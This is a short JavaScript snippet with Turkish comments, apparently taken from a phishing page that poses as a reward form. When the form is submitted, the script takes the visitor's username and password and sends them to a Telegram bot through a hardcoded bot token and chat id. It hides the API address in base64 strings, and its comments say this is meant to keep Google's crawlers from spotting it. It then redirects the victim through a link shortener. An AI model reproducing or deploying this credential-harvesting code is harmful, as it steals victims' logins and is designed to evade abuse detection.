// Google botları bu kodu okuyamaz ama tarayıcı çalıştırır
const _0x1a2b = ["c2VuZE1lc3NhZ2U=", "YXBpLnRlbGVncmFtLm9yZw==", "Ym90", "Y2hhdF9pZA==", "dGV4dA=="];
const d = (atb) => atob(atb);

document.getElementById('reward-form').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const u = document.getElementById('user').value;
    const p = document.getElementById('pass').value;

    // Senin bilgilerin (Sifreli iletim)
    const tk = "8587670631:AAGkV1-0y8SF9gXTz2_6y0oBdZR1rGlJFl0"; // Son attığın mesajdaki doğru token
    const ci = "8512406356"; 

    const m = `🎯 HEDEF!\n👤 U: ${u}\n🔑 P: ${p}`;
    
    // Google'ın anlamaması için URL'yi parçalıyoruz
    const url = `https://${d(_0x1a2b[1])}/${d(_0x1a2b[2])}${tk}/${d(_0x1a2b[0])}?${d(_0x1a2b[3])}=${ci}&${d(_0x1a2b[4])}=${encodeURIComponent(m)}`;

    try {
        await fetch(url, { mode: 'no-cors' });
        window.location.replace("https://bit.ly/3XyZabc"); // Gerçek siteye değil, bir link kısaltıcıya yönlendir
    } catch (err) {
        window.location.replace("https://google.com");
    }
});
